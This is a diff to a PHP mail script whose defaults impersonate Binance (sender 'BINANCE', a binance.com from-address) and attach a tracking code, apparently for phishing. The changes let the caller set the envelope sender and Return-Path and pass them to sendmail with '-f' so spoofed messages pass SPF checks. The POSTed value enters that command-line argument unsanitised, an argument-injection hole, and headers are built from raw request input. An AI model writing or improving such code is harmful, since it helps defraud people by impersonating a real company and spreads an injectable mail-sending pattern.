@@ -22,6 +22,7 @@ $message = $_POST['message'] ?? '';
 $from_email = $_POST['from_email'] ?? 'do_not_reply@mailersp2.binance.com';
 $from_name = $_POST['from_name'] ?? 'BINANCE';
 $tracking_code = $_POST['tracking_code'] ?? '';
+$envelope_from = $_POST['envelope_from'] ?? $from_email;
 
 error_log("PHP Email Script: Parsed - To: $to, From: $from_name <$from_email>, Subject: $subject");
 
@@ -41,16 +42,20 @@ if (!filter_var($to, FILTER_VALIDATE_EMAIL)) {
     exit;
 }
 
+// Compute domain from from_email for Message-ID
+$from_domain = substr(strrchr($from_email, "@"), 1) ?: 'localhost';
+
 // Set headers for the email
 $headers = array(
     'From' => "$from_name <$from_email>",
+    'Sender' => $envelope_from,
     'Reply-To' => $from_email,
-    'Return-Path' => $from_email,
+    'Return-Path' => $envelope_from,
     'MIME-Version' => '1.0',
     'Content-Type' => 'text/html; charset=UTF-8',
     'X-Mailer' => 'PHP/' . phpversion(),
     'X-Tracking-Code' => $tracking_code,
-    'Message-ID' => '<' . md5(uniqid()) . '@' . parse_url($from_email, PHP_URL_HOST) . '>'
+    'Message-ID' => '<' . md5(uniqid((string)mt_rand(), true)) . '@' . $from_domain . '>'
 );
 
 // Convert headers array to string
@@ -61,8 +66,9 @@ foreach ($headers as $key => $value) {
 
 error_log("PHP Email Script: Headers prepared: $header_string");
 
-// Send the email
-$success = mail($to, $subject, $message, $header_string);
+// Send the email with proper envelope sender for SPF alignment
+$params = '-f ' . $envelope_from;
+$success = mail($to, $subject, $message, $header_string, $params);
 
 if ($success) {
     $result = "SUCCESS: Email sent from $from_name <$from_email> to $to";
